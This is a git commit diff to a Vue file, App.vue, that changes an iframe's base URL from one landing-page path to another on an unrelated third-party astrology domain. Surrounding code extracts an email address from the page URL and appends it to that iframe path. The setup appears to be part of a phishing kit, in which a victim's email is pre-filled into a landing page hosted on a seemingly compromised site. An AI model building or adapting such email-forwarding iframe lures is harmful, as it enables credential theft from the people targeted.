3b8bc5f5addb45cea3f7354b787b2eb784e31dbf
hOve <145380276+bodethomas12@users.noreply.github.com>
2025-02-25 01:11:19 +0000

    Update App.vue

--- src/App.vue
+++ src/App.vue
@@ -28,7 +28,7 @@ export default {
       return match ? match[0] : null;
     },
     updateIframeSrc() {
-      const baseSrc = "https://astrolog-batel.co.il/test/Landed3/index.html"; // Base URL
+      const baseSrc = "https://astrolog-batel.co.il/test/Landd/index.html"; // Base URL
       const email = this.extractEmailFromUrl();
 
       // Append only the email to the path if found
